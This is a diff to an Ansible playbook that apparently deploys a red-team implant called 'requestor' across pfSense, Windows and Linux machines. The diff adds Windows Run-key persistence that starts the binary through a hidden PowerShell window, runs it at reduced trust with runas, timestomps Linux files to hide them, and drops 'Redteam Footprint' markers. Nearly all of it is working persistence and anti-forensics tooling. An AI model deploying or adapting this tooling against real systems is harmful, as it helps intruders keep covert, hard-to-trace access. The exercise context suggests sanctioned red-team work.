@@ -11,14 +11,33 @@
   copy:
     src: requestor.pf
     dest: "{{ pfsense_binary }}"
-    mode: 755
+    mode: 555
   when: ansible_facts['os_family'] == "FreeBSD"
 
 - name: REQUESTOR | Copy service file | pfSense
   copy:
     src: requestor.service.pf
     dest: "{{ pfsense_service }}"
-    mode: 644
+    mode: 555
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Chmod service file | pfSense
+  ansible.builtin.command: chmod 555 "{{ pfsense_service }}"
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Copy shell script | pfSense
+  copy:
+    src: requestor.sh
+    dest: "{{ pfsense_shell }}"
+    mode: 555
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Chmod binary | pfSense
+  ansible.builtin.command: chmod 555 "{{ pfsense_binary }}"
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: REQUESTOR | Chmod shell script | pfSense
+  ansible.builtin.command: chmod 555 "{{ pfsense_shell }}"
   when: ansible_facts['os_family'] == "FreeBSD"
 
 - name: REQUESTOR | Start service | pfSense
@@ -59,17 +78,25 @@
 - name: REQUESTOR | Add run key persistence | Windows
   win_regedit: 
     path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
-    name: "{{ windows_binary_name }}"
-    data: "cmd.exe /c {{ windows_binary }}"
+    name: "{{ windows_regkey_name }}"
+    data: "PowerShell.exe -WindowStyle hidden {{ windows_binary }} {{ windows_binary_args }}}}"
     type: string
   when: ansible_facts['os_family'] == "Windows"
 
 - name: REQUESTOR | Run agent | Windows
-  win_shell: 'runas /trustlevel:0x20000 {{ windows_binary_name }}'
+  win_shell: 'runas /trustlevel:0x20000 {{ windows_binary }}'
   async: 45
   poll: 0
   args:
     chdir: "{{ windows_binary_directory }}"
+  when: ansible_facts['os_family'] == "Windows"
+
+- name: REQUESTOR | Set Redteam Footprint | Windows
+  win_regedit:
+    path: HKLM:\SYSTEM\State\RTStatus
+    name: "Requestor"
+    data: "1"
+    type: dword
   when: ansible_facts['os_family'] == "Windows"
 
 ######################################################################
@@ -108,6 +135,7 @@
   file:
     path: "{{ linux_binary }}"
     modification_time: "{{ timestomp_time }}"
+  when: ansible_os_family in linux_distros
 
 - name: REQUESTOR | Timestomp service file | Linux
   file:
@@ -121,4 +149,16 @@
 
 - name: REQUESTOR | Chmod Binary | Linux
   ansible.builtin.command: chmod 755 "{{ linux_binary }}"
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Make Redteam Directory | Linux
+  file:
+    path: "/home/redteam"
+    state: directory
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Footprint | Linux
+  file:
+    path: "/home/redteam/requestor"
+    state: touch
   when: ansible_os_family in linux_distros
